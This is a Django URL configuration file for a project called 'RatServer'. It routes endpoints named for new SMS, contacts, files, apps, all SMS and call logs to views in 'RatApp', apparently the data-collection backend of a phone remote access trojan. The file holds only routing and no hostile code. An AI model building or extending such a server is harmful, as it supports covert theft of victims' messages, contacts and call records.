"""RatServer URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/4.0/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
"""
from django.contrib import admin
from django.urls import path
from RatApp.views import on_new_sms, on_contact, on_file, on_app, on_all_sms, on_call_log

urlpatterns = [
    path('admin/', admin.site.urls),
    path('newsms/', on_new_sms),
    path('oncontact/', on_contact),
    path('onfile/', on_file),
    path('onapp/', on_app),
    path('onallsms/', on_all_sms),
    path('oncalllog/', on_call_log)
]
